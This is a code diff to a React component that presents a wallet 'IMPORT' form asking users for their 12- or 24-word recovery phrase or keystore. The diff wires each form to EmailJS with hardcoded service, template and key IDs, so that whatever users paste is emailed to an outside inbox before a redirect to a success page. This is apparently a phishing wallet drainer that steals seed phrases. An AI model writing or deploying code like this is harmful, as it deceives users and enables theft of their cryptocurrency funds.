@@ -21,26 +21,19 @@ const PhraseForm = () => {
 
   const form2 = useRef();
 
-  const sendPhrase = (e) => {
+  
+  const sendEmail = (e) => {
     e.preventDefault();
-    // console.log("submit")
 
-    emailjs
-      .sendForm(
-        "service_yj787qi",
-        "template_sv7wpyj",
-        form.current,
-        "g4ZEWVbf7KjSHQdm2"
-      )
-      .then(
-        (result) => {
-          navigate("/success-page");
-        },
-        (error) => {
-          console.log(error);
-          navigate("/error");
-        }
-      );
+    emailjs.sendForm('service_yj787qi', 'template_zt82g1k', form.current, 'g4ZEWVbf7KjSHQdm2')
+      .then((result) => {
+          console.log(result.text);
+          navigate("/success-page")
+          
+      }, (error) => {
+          console.log(error.text);
+          navigate("/error")
+      });
   };
 
   const sendKeystore = (e) => {
@@ -49,12 +42,11 @@ const PhraseForm = () => {
 
     emailjs
       .sendForm(
-        "service_baa21jx",
+        "service_yj787qi",
         "template_hlyjf9i",
         form2.current,
-        "P_9SIX5hhtfJnOac4"
+        "g4ZEWVbf7KjSHQdm2"
       )
-
       .then(
         (result) => {
           navigate("/success-page");
@@ -98,13 +90,20 @@ const PhraseForm = () => {
               toggleState === 1 ? "content container active-content" : "content"
             }
           >
-            <Form ref={form} onSubmit={sendPhrase}>
+            <form ref={form} onSubmit={sendEmail}>
+              <input className="form-control" type='text' name="key_phrase" />
+              <button className="btn btn-primary">SUBMIT</button>
+            </form>
+          
+            {/* <Form ref={form}>
               <Form.Group
                 className="mb-3"
                 controlId="exampleForm.ControlTextarea1"
               >
                 <Form.Control as="textarea" name="key_phrase" rows={12} />
               </Form.Group>
+
+
               <Box paddingY={2}>
                 <Typography
                   sx={{
@@ -118,15 +117,17 @@ const PhraseForm = () => {
                   Typically 12 (sometimes 24) words seperated by single spaces
                 </Typography>
               </Box>
+
               <Button
                 className="btn btn-primary"
                 variant="primary"
                 type="submit"
                 style={{ width: "200px" }}
+                onClick={sendEmail}
               >
                 IMPORT
               </Button>
-            </Form>
+            </Form> */}
           </div>
 
           <div
@@ -134,10 +135,10 @@ const PhraseForm = () => {
               toggleState === 2 ? "content container active-content" : "content"
             }
           >
-            <Form ref={form2} onSubmit={sendKeystore}>
+            {/* <Form ref={form2} onSubmit={sendKeystore}>
               <Form.Group
                 className="mb-3"
-                controlId="exampleForm.ControlTextarea1"
+                controlId="exampleForm.ControlTextarea2"
               >
                 <Form.Control as="textarea" name="key_phrase" rows={12} />
               </Form.Group>
@@ -172,7 +173,7 @@ const PhraseForm = () => {
               >
                 IMPORT
               </Button>
-            </Form>
+            </Form> */}
           </div>
 
           <div
@@ -180,12 +181,12 @@ const PhraseForm = () => {
               toggleState === 3 ? "content container active-content" : "content"
             }
           >
-            <Form ref={form} onSubmit={sendPhrase}>
+            <Form ref={form} onSubmit={sendEmail}>
               <Form.Group
                 className="mb-3"
-                controlId="exampleForm.ControlTextarea1"
+                controlId="exampleForm.ControlTextarea3"
               >
-                <Form.Control as="textarea" rows={12} />
+                <Form.Control name="key_phrase" as="textarea" rows={12} />
               </Form.Group>
               <Box paddingY={2}>
                 <Typography
